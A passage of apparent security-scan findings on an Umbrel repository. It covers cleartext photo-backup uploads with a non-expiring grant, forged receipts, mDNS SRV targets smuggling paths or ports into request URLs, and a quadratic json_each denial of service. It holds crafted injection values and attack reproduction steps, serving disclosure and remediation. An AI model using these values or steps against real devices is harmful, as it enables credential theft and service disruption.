4. [clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift:302–315](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift#L302-L315)
   While connectivityRecovering (the state entered after a job failed with a connection error, i.e. Tailscale down) creationLimit is still 1: the extension creates a fresh upload job as a 'reachability probe' with no route/interface check, so a request carrying the grant and a full photo is emitted over whatever route iOS has. The README's 'pauses without Tailscale' is therefore reactive, after the request has left the device.
5. [clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift:198–208](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift#L198-L208)
   Connectivity recovery retries one failed job as the probe; a 'successful' terminal result from any responder clears connectivityRecovering (PhotoBackupRecoveryState.observeTerminalBatch) and reopens the whole queue, so an attacker answering 200 drains the library.
6. [clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift:641–649](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift#L641-L649)
   successfulReceipt(for:) trusts unauthenticated response headers: a job counts as uploaded when job.state == .succeeded and the response echoes x-umbrel-photo-backup-key (visible in the request) plus any plausible x-umbrel-upload-bytes; acknowledge() then calls ledger.recordResourceSucceeded. An on-path responder can forge receipts so the ledger marks assets backed up that the real Umbrel never received.
7. [clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift:171–181](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift#L171-L181)
   A forged 'x-umbrel-photo-backup-error: insufficient-storage' header from an on-path responder sets storagePaused via observeTerminalBatch and halts the whole backup source until manual user retry.
8. [clients/apple/ios/BackgroundUploadExtension/Info.plist:28–39](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/BackgroundUploadExtension/Info.plist#L28-L39)
   ATS exception explicitly enables insecure HTTP loads to 100.64.0.0/10 for the extension (same exception in ios/Sources/Info.plist for the app).
9. [clients/apple/UmbrelKit/Sources/UmbrelKit/SavedDevice.swift:90–93](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/SavedDevice.swift#L90-L93)
   isTailscaleAddress is a bare 100.64/10 range test; photoBackupHost (line 161) selects the first server-reported address matching it. Any CGNAT literal, including an ISP CGNAT address on the Umbrel's own interface, is treated as a Tailscale route.
10. [packages/umbreld/source/modules/auth/auth.ts:853–862](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L853-L862)
   #createDerivedCredential issues the photo-backup grant with no expiresAt.
11. [packages/umbreld/source/modules/auth/auth.ts:895–903](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L895-L903)
   #isSessionActive treats a native session without expiresAt as active forever and #isCredentialActive treats any non-'native-access' credential without expiresAt as active forever, so a captured grant stays valid until the user disables backup or signs out.
12. [packages/umbreld/source/modules/photos/api.ts:231–241](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/api.ts#L231-L241)
   The photos router accepts POST /upload with X-Umbrel-Photo-Backup-Key from any client presenting the bearer grant (authorizePhotoBackupRequest, http-request.ts:12-16); there is no interface, origin or route restriction binding the grant to Tailscale.
13. [packages/umbreld/source/modules/photos/api.ts:55–91](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/api.ts#L55-L91)
   What a captured grant buys: authenticated POST /api/photos/upload writes attacker-chosen files (extension-constrained, keep-both collision) into the victim account's photo backup folder and keeps the native session touched, reachable over any route to the device.
14. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:802–806](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L802-L806)
   The public port-80 listener is a plain HTTP proxy to umbreld (no HTTPS redirect), so a captured photo-backup grant is replayable from the LAN as well as over Tailscale.
15. [packages/umbreld/source/modules/system/system.ts:717–756](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/system.ts#L717-L756)
   Secondary: getIpAddresses deliberately includes tunnel interfaces and excludes only 127/8 and 169.254/16, so a CGNAT (100.64/10) address on the Umbrel's own WAN-facing interface is reported to the client and selected as the 'Tailscale' photo-backup host.

## Impact
Confidentiality: full-resolution photo and video library plus a non-expiring upload credential are disclosed to the on-path party. Integrity: forged receipts make the client ledger and UI report assets as backed up that were never stored, defeating the backup feature silently; forged headers can also pause the source. Availability: backup is stalled via the insufficient-storage header until manual retry. Subsequent-system impact: The captured grant authenticates to the victim's umbrelOS device over any reachable route (LAN port 80/443, Tailscale) for POST /api/photos/upload only, letting the attacker place arbitrary files (extension-constrained) into the victim's photo backup folder indefinitely and keep the native session alive; keep-both collision prevents overwriting existing files. No read access; disk-fill is volumetric and not rated.

## Reproduction steps
1. Attacker shares a network segment with the victim iPhone (rogue/evil-twin AP, hostile hotspot, ARP spoofing, or holds the CGNAT literal on a carrier network) while the victim's Tailscale VPN is disconnected - a routine runtime state the project itself anticipates ('pauses without Tailscale') and outside the attacker's control, hence AT:P. PhotoKit schedules the extension in the background with no user action; the extension creates or retries one probe job with no route check, delivering a photo and the bearer grant in cleartext to the attacker's TCP listener answering for 100.x.y.z. Replying 200 with the echoed key header reopens the whole queue. No credentials or victim interaction are needed and no security mechanism must be defeated. Assumes standard iOS routing with the tunnel down and PhotoKit treating 2xx as .succeeded (iOS 26.5).

## Recommended fix
1. Upload requests carrying a long-lived bearer credential and user media are sent over cleartext HTTP to a CGNAT literal with no server authentication and no assurance the packets traverse the Tailscale tunnel (destination policy instead of transport security). Fix criteria: Media and the grant must never leave the device unprotected: either the upload uses an authenticated, encrypted transport whose server identity the client verifies (e.g. HTTPS with a certificate the uploader can validate), or the extension verifiably confines the request to the Tailscale interface/route and refuses to create or retry jobs when that route is absent. Verify by disconnecting Tailscale on a hostile Wi-Fi: no cleartext POST with Authorization header reaches the gateway.
2. Upload receipts (x-umbrel-photo-backup-key / x-umbrel-upload-bytes / insufficient-storage header) are trusted from an unauthenticated responder, so backup state can be forged. Fix criteria: A receipt must be accepted only when it provably originates from the real Umbrel (authenticated transport, or a receipt MAC bound to the grant/resource key that an on-path responder cannot compute). Verify by answering a job with an echoed key from a non-Umbrel host: the ledger must not mark the asset uploaded nor pause the source.
3. A captured photo-backup grant never expires and is accepted from any network path to the device. Fix criteria: Limit blast radius of a leaked grant: bound its lifetime or rotate it, and/or have the server accept photo-backup grants only from the Tailscale interface it was provisioned for. Verify that a grant presented over LAN HTTP or after the configured lifetime is rejected.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cleartext transmission
**CWE:** [CWE-319](https://cwe.mitre.org/data/definitions/319.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258130

---

# Bonjour SRV target used verbatim as URL authority lets LAN peer rewrite saved Umbrel host

## Details
UmbrelKit treats the hostname carried in an attacker-controlled mDNS SRV record as an opaque string and uses it, unvalidated, both as the authority of every URL it builds and as the persisted `host` of an already-paired device.

Flow: Discovery.swift `ServiceResolver.resolved()` (279-283) copies dnssd's `hosttarget` into `Candidate.host` after only stripping a trailing dot and publishes immediately. A LAN peer advertising `_umbrel._tcp` with TXT `id=<victim's public discovery id>` (readable from the genuine TXT record or the public `system.discoveryInfo`) can set an SRV target such as `192.168.1.5/trpc/system.discoveryInfo#` or `192.168.1.5:8080`, where 192.168.1.5 is the real Umbrel. `Umbreld.identifyCandidate` (491-517) iterates `[candidate.host] + addresses` with no shape check (`localDiscoveryCandidate`, 520-527, only drops 100.64/10 literals) and `httpsRequest` (1901-1906) builds `https://\(host)/trpc/system.discoveryInfo` by interpolation. Foundation parses the crafted string as host 192.168.1.5 plus path/fragment or port; `LocalHTTPSSessionPool.data` (195-199) keys and hostname-checks the pinned session by `url.host`, so the TLS pin validates against the genuine device's CA and the genuine device answers with the saved id. The probe 'verifies', `IdentifiedDevice.host` is the crafted string, and `SavedDevice.mergeVerifiedDiscovery` (169-176) writes it (and the attacker's service name) into the saved record, persisted to config.json automatically by iOS `SavedDeviceDiscoveryMonitor` (72-117, while the app is active) and macOS `AppState.discoveryUpdated` (345-376). On macOS the id-dedup keeps the lexicographically smallest host, so a digit-leading crafted host beats `umbrel.local` even while the genuine device advertises; on iOS the dedup prefers Bonjour-shaped hosts, so the attacker additionally suppresses the genuine advertisement with spoofed mDNS goodbye records.

Afterwards `connectionHosts` is `[crafted] + <known IPv4s>`; `NativeEndpointResolver.firstVerified` (EndpointResolver.swift:194-230) races them and caches the first `.verified` answer as winner, and only connectivity errors evict it.

Consequences:
1. Unauthenticated LAN peer alone, no user interaction: whenever the crafted path/fragment route wins the race, every authenticated request becomes `https://192.168.1.5/trpc/system.discoveryInfo#/trpc/<procedure>`; `apps.list`, `user.get`, etc. receive discoveryInfo JSON and fail to decode (protocolFailure, which neither `withResolvedHost` retries nor evicts the winner), so the client stays broken until a path change or relaunch; the persisted host and display name survive restarts while the attacker advertises.
2. Credential redirection: with target `192.168.1.5:<port>` the handshake still validates (lan-ingress terminates TLS on every app port with the same leaf whose SANs include all interface IPs, lan-ingress.ts:366-367, 1016-1020) and the request is forwarded to the app on that port without login when the app is published directly / host-network (`canRouteAppDirectly`, 578-588) or its own compose sets `PROXY_AUTH_ADD=false` (app-gateway.ts:95, 269). An app answering `/trpc/system.discoveryInfo` with the public id becomes the saved host; the client then sends the Bearer access token on every call, `user.refreshNativeAccess` with the long-lived `deviceToken` (1781-1797), and `user.loginNative` with the owner's password (950-966) to the app, which can relay to umbreld to stay invisible. A host-network app can itself emit the mDNS answers. This crosses the app-container -> owner-credential boundary without any impostor CA.

The maintainers ship `SavedDevice.isValidLocalEndpointHost` (tested to reject `umbrel.local/path`, `user@umbrel.local`, `umbrel.local:443`) but apply it only in `savedIdentityRecoveryDecision`, not to Bonjour candidates nor to hosts written by `mergeVerifiedDiscovery`/`rememberConnectionCandidates`.

Assumptions (platform components, not pinned in this repository): Apple's mDNSResponder/dnssd on iOS 17+/macOS 14+ renders SRV target labels with only '.', '\\' and bytes <= 0x20 escaped, so '/', '#', '?', '@' and ':' reach the resolve callback verbatim; Foundation `URL(string:)` parses `https://1.2.3.4/x#y` and `https://1.2.3.4:8080/x` with host 1.2.3.4.

## Evidence
1. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:491–527](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L491-L527)
   identifyCandidate probes `[acceptedCandidate.host] + addresses` and returns IdentifiedDevice(host: host) with the string that answered; localDiscoveryCandidate (520-527) is the only filter on a Bonjour candidate and drops just 100.64/10 literals. No check that host is a bare hostname or IPv4 literal, so a hosttarget carrying '/', '#', '?' or ':port' passes straight into the URL and into the result.
2. [clients/apple/UmbrelKit/Sources/UmbrelKit/SavedDevice.swift:169–176](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/SavedDevice.swift#L169-L176)
   mergeVerifiedDiscovery overwrites the persisted `host` and `name` with the Bonjour-derived strings once the probed id matches; previously known IPv4 addresses are kept, so the crafted host becomes connectionHosts[0] (lines 80-88) and competes as a verified route.
3. [clients/apple/UmbrelKit/Sources/UmbrelKit/Discovery.swift:279–283](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Discovery.swift#L279-L283)
   ServiceResolver.resolved() copies dnssd's SRV hosttarget into `host` after only stripping the trailing dot, and publish() runs immediately so the candidate is identified before (and regardless of) any address query result.
4. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1894–1906](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L1894-L1906)
   nativeRequest/httpsRequest build every URL by string interpolation `https://\(host)/trpc/\(path)`; a host of `192.168.1.5/trpc/system.discoveryInfo#` or `192.168.1.5:8080` restructures the URL (path/fragment or port) while Foundation still parses the authority as 192.168.1.5.
5. [clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift:195–199](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift#L195-L199)
   The pinned session is keyed and hostname-checked by `request.url?.host` (the parsed authority), so a crafted string whose authority is the genuine device validates against the saved CA pin; the pin proves the TLS peer, not the URL path or port.
6. [clients/apple/UmbrelKit/Sources/UmbrelKit/EndpointResolver.swift:194–230](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/EndpointResolver.swift#L194-L230)
   firstVerified races every connectionHost in parallel and the first `.verified` answer becomes the cached winner; a crafted host that returns the device id (same umbreld path, or an app answering it) wins a share of resolutions, and only connectivity errors invalidate the winner (Umbreld.swift:1618-1620), so decode failures on the crafted route are sticky.
7. [clients/apple/ios/Sources/SavedDeviceDiscoveryMonitor.swift:72–117](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/SavedDeviceDiscoveryMonitor.swift#L72-L117)
   Shipped iOS consumer (started from RootView.swift:186): candidates whose TXT id matches a saved device are identified with the saved pin and merged into config without user interaction; the dedup prefers Bonjour-shaped hosts, so the attacker must also suppress the genuine advertisement (spoofed mDNS goodbye) for the crafted host to be chosen.
8. [clients/apple/macos/Sources/Umbrel/AppState.swift:345–376](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/macos/Sources/Umbrel/AppState.swift#L345-L376)
   Shipped macOS consumer: Umbreld.identify(candidates:) dedups by id keeping the lexicographically smallest host, so a digit-leading crafted host beats `umbrel.local`; the result is merged via mergeVerifiedDiscovery and config.save, and nativeTarget(for:) (731-742) later feeds that host to requests unfiltered.
9. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:366–367](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L366-L367)
   The server leaf's SANs include every IPv4 interface address, and createHttpsProxyServer (1016-1020) uses that same certificate on every app port, so https://<ip>:<app-port> validates against the pinned CA.
10. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:578–587](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L578-L587)
   Directly-published and host-network apps are routed to the app with no gateway; gateway apps whose own compose sets PROXY_AUTH_ADD=false (app-gateway.ts:95, isAuthorized returns early at 269) are forwarded without login, so a crafted host:port lands on app-controlled code.
11. [clients/apple/UmbrelKit/Tests/UmbrelKitTests/NativeTransportTests.swift:30–40](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Tests/UmbrelKitTests/NativeTransportTests.swift#L30-L40)
   Maintainers test that isValidLocalEndpointHost rejects URL syntax (path, userinfo, port), but the check is applied only in savedIdentityRecoveryDecision (Umbreld.swift:386-388), not to Bonjour candidates or hosts written by mergeVerifiedDiscovery.

## Impact
Rated on the credential-redirection path: the native client's Bearer access token, its long-lived deviceToken and, on the next sign-in, the owner's password are delivered over the pinned channel to app-controlled code (C:HIGH); the persisted device record (host/name) is rewritten under attacker control and all of the app's traffic to that Umbrel is routed through the attacker's endpoint (I:HIGH). In the LAN-peer-only variant the client's connectivity to its Umbrel is broken for as long as the crafted route holds the cached winner and the record stays corrupted across restarts (A:LOW). Subsequent-system impact: The captured deviceToken mints owner access tokens via user.refreshNativeAccess and the captured password yields an owner native session via the public user.loginNative, giving an app container (or the LAN peer it relays to) full control of the umbrelOS device and its data.

## Reproduction steps
1. An unauthenticated peer on the victim's LAN answers _umbrel._tcp browse/resolve queries with TXT id = the Umbrel's public discovery id and an SRV target of `<real-ip>/trpc/system.discoveryInfo#` or `<real-ip>:<port>`. The iOS/macOS app, while open, probes it over the pinned TLS session, the genuine device (or an app behind its ingress) answers with the id, and the crafted string is persisted as the saved host with no user action (PR:N, UI:N, AV:A). Attack requirements are present: the crafted route must win the parallel endpoint race against the real addresses (repeatable on every resolve), on iOS the genuine advertisement must be suppressed with spoofed goodbye records, and the credential-redirection variant needs an installed app that lan-ingress forwards without gateway login (direct/host-network, or the app's own PROXY_AUTH_ADD=false) under the attacker's control — a named adversary, and a host-network app can emit the mDNS itself.

## Recommended fix
1. Bonjour SRV hosttarget is accepted as a connection endpoint and persisted without validating that it is a bare DNS hostname or IPv4 literal, so URL syntax inside it restructures every request URL and survives into the saved device record. Fix criteria: Every candidate host (Bonjour hosttarget, resolved addresses, merged/remembered addresses) must pass a strict shape check (SavedDevice.isValidLocalEndpointHost or an equivalent admitting only RFC-1123 labels or dotted-quad literals) before probing and before being written to a SavedDevice; a target containing '/', '#', '?', '@' or ':' must be dropped in Discovery or localDiscoveryCandidate and must never reach mergeVerifiedDiscovery or connectionHosts.
2. Request URLs are assembled by string interpolation of the host into 'https://<host>/trpc/<path>', trusting the host string to be an authority only. Fix criteria: Build request URLs with URLComponents (scheme, host, port and path set as separate fields, port fixed to the dashboard HTTPS port) so a host value cannot inject path, query, fragment, port or userinfo; verify that a host containing such characters fails URL construction rather than being percent-encoded into a different resource.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource injection
**CWE:** [CWE-99](https://cwe.mitre.org/data/definitions/99.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258129

---

# Unbounded Photos source scope paths cause quadratic json_each evaluation on shared index writer

## Details
The Photos source scope stored by `photos.sources.update` is attacker-sized and is evaluated per indexed row by a correlated `json_each` subquery on the single file-index writer connection.

Path: an authenticated member (or owner) calls `photos.sources.update({id: 'umbrel:<accountId>', scope: {mode: 'only', paths: [...]}})`. `routes.ts:180-183` validates `paths` only as `z.array(z.string())` (no element count or length bound). `PhotosRepository.updateSource` (repository.ts:1243-1268) normalizes and dedupes the strings, checks each one equals or starts with the caller's own home root (`/Users/<slug>/a1`, `/Users/<slug>/a2`, ... all pass; members have an indexed `home` root per files.ts:417-424) and persists `JSON.stringify(paths)` into the durable `umbrel.photos_sources.scope_paths`. Still inside the same `immediate()` transaction on the writer it calls `#refreshEffectiveTakenAt(database, accountId)` with no hash list, i.e. a whole-account projection via `PhotosReadModel.refresh` -> `rawPhotoLibraryCte()` (read-model.ts:87-122). The call arrives through `FileIndexEngine.photosUpdateSource` -> `#mutate` (file-index-engine.ts:1968-1970, 2207-2226), which serializes it on `#mutationQueue` (concurrency 1).

Sink: `sourceScopeSql` (library-sql.ts:277-294) renders `EXISTS (SELECT 1 FROM json_each(source.scope_paths) WHERE <outer path> = value OR (...))` (or `NOT EXISTS` for `everything-except`). The predicate references the outer row's `root_virtual_path || '/' || relative_path`, so the subquery is correlated and SQLite instantiates `json_each` per `indexed_locations` row (library-sql.ts:131-144), re-parsing the JSON text and scanning elements until a match; for synthetic non-matching paths every element is visited for every row. Cost is O(rows x paths) comparisons plus O(rows x JSON_bytes) parsing, where the attacker chooses both factors (rows by uploading small media to their own home). The tRPC express adapter is created without `maxBodySize` (server/trpc/index.ts:69-75) and no express body parser precedes it (server/index.ts:216), so a multi-megabyte `paths` array is accepted.

Impact: the statement holds the writer transaction inside the shared `#mutationQueue`. All Files index writes (scan reconciliation, watcher updates, enrichment, trash/move bookkeeping) for every account and every Photos read for every account (which must pass `prepareRead` through the same queue, file-index-engine.ts:1874-1896) stall until it completes; plain Files browsing on the reader pool continues. The stored value is durable, so the cost recurs on every later whole-account refresh of that account (projection recovery / index rebuild, >32,768 dirty hashes, another `sources.update`) and on the `PhotosIndexingStatus.sync` rebuild of `photos_indexing_work` with `workSql('1')` (indexing-status.ts:11-34, 89-100), which also embeds `sourceScopeSql` and runs on the first `indexingState` read after the scope changes (`photos.ts:838-845` triggers one immediately). A member therefore gets a repeatable, attacker-sized denial of service against the owner's Photos and Files indexing, crossing the member -> owner boundary the threat model names.

This is algorithmic (product of two attacker-chosen sizes in one request), not volumetric; a single request suffices. Dependency assumptions: @trpc/server 11.18.0 (locked) applies no request body limit when `maxBodySize` is unset; better-sqlite3 12.11.1's bundled SQLite evaluates a correlated `json_each` table-valued subquery per outer row, re-parsing text JSON in xFilter.

## Evidence
1. [packages/umbreld/source/modules/photos/repository.ts:1243–1267](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L1243-L1267)
   updateSource accepts scope.paths of any length; it only normalizes/dedupes and checks each path is under the caller's home root, then stores JSON.stringify(paths) into umbrel.photos_sources.scope_paths and immediately runs a whole-account #refreshEffectiveTakenAt (no hash list) inside a writer transaction (update.immediate()).
2. [packages/umbreld/source/modules/photos/library-sql.ts:277–293](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/library-sql.ts#L277-L293)
   sourceScopeSql emits a correlated EXISTS/NOT EXISTS over json_each(scope_paths) for modes 'only' and 'everything-except'. The predicate references the outer row's path, so SQLite instantiates json_each (re-parsing the JSON text) and walks elements for every candidate row: O(rows x paths) work and O(rows x JSON bytes) parsing.
3. [packages/umbreld/source/modules/photos/library-sql.ts:131–143](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/library-sql.ts#L131-L143)
   authorized_locations applies sourceScopeSql to every home indexed_locations row of the account during projection; the whole-account refresh from updateSource (and every later whole-account refresh) executes this on the writer connection.
4. [packages/umbreld/source/modules/photos/routes.ts:180–201](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/routes.ts#L180-L201)
   sources.update is privateProcedureWithMembers (accountProcedure, reachable by member accounts) and validates scope as z.object({mode, paths: z.array(z.string())}) with no element count or string length limit.
5. [packages/umbreld/source/modules/photos/indexing-status.ts:11–33](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/indexing-status.ts#L11-L33)
   workSql also embeds sourceScopeSql over every content-identity home entry; sync() (lines 89-100) rebuilds photos_indexing_work with workSql('1') whenever counts.scope_paths differs from the durable value, i.e. on the indexingState read photos.ts triggers right after the update, again on the writer.
6. [packages/umbreld/source/modules/files/file-index-engine.ts:2207–2226](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L2207-L2226)
   #mutate runs every index write, including photosUpdateSource (lines 1968-1970), as an immediate transaction on the single #mutationQueue (concurrency 1), so the long projection blocks all other index writes for every account.
7. [packages/umbreld/source/modules/files/file-index-engine.ts:1874–1895](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L1874-L1895)
   Every Photos read for every account first enters the same #mutationQueue (prepareRead) before pinning a reader snapshot, so a long writer transaction stalls Photos for all accounts, including the owner.
8. [packages/umbreld/source/modules/server/trpc/index.ts:69–74](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/index.ts#L69-L74)
   createExpressMiddleware is configured without maxBodySize and server/index.ts:216 mounts it with no preceding body parser, so the tRPC request body carrying scope.paths is not size-limited (assumes @trpc/server 11.18.0 default of no limit).

## Impact
No confidentiality or integrity impact. Availability: the file-index writer is a single shared queue; for an attacker-chosen duration (minutes to hours per request, scaling with body size x the attacker's own media row count) Files index writes for every account and all Photos reads for every account (including the owner) are blocked, and the durable scope makes the stall recur on whole-account refreshes and indexing-status rebuilds. The daemon itself and reader-pool Files browsing stay up, so the loss is confined to Photos and file indexing, but it is sustained, repeatable and crosses the member -> owner boundary. Assumptions: @trpc/server 11.18.0 express adapter imposes no body limit when maxBodySize is unset; better-sqlite3 12.11.1's bundled SQLite evaluates a correlated json_each table-valued subquery per outer row.

## Reproduction steps
1. Attacker: any authenticated member account over the LAN/Tor/Tailscale dashboard (members are a named adversary; sources.update is accountProcedure). Delivery: one tRPC `photos.sources.update` mutation with `mode: 'only'` and a very large `paths` array of distinct strings under their own `/Users/<slug>/` prefix (all pass the prefix check). No body size limit is configured. The server immediately executes a whole-account projection on the writer with a per-row correlated json_each over the stored JSON, stalling the shared mutation queue; the stored value makes later whole-account refreshes and the indexing-status rebuild repeat the cost, and the attacker can re-send at will. No user interaction and no special deployment state required.

## Recommended fix
1. `sources.update` accepts an unbounded `scope.paths` array (count and string length) that is persisted and later drives per-row SQL evaluation; validation checks only the prefix of each path. Fix criteria: Scope input is bounded: a small maximum number of paths and a maximum path length are enforced at the route/repository boundary (and ideally that paths exist as indexed directories under the caller's root), so the stored JSON has a fixed small upper size. Verification: a request with thousands of paths or multi-megabyte path strings is rejected with BAD_REQUEST and nothing is written to photos_sources.
2. `sourceScopeSql` evaluates a correlated `json_each(scope_paths)` subquery per candidate row, giving O(rows x paths) and re-parsing the JSON for every row, on the single writer connection that every account's index writes and Photos reads wait on. Fix criteria: Scope matching cost is linear in rows: scope paths are materialized once per statement (e.g. a CTE or temp table of normalized prefixes) and joined/indexed against entry paths rather than re-parsed per row, or the whole-account refresh is chunked so one account's scope change cannot hold the writer for the duration of the full projection. Verification: a scope with the maximum allowed paths on a large home library completes the projection in time proportional to the row count and does not block other accounts' Photos reads or Files mutations.

---
**Severity:** HIGH
**Status:** Open
**Category:** Algorithmic complexity DoS
**CWE:** [CWE-407](https://cwe.mitre.org/data/definitions/407.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258127

---

# Impostor sharing public discovery id displaces genuine Umbrel in pairing and captures owner login

## Details
The Apple clients pair with an unsaved Umbrel by trust-on-first-use: `Umbreld.verifiedFirstUseCandidate` (Umbreld.swift:266-279) fetches `http://<host>/trpc/system.localHttpsIdentity` in plaintext from whatever host Bonjour or manual entry supplied, takes the returned PEM as the candidate anchor, and only checks that `https://<host>/trpc/system.discoveryInfo` validated against that same anchor returns the same `id`. The host controls both values, so the check proves nothing about which device answered. The project documents this as intended (`Explicitly selecting an unsaved card establishes first-use trust`, Umbreld.swift:280-283; README `Pairing saves the Umbrel's local CA`) and relies on the user choosing the right card.

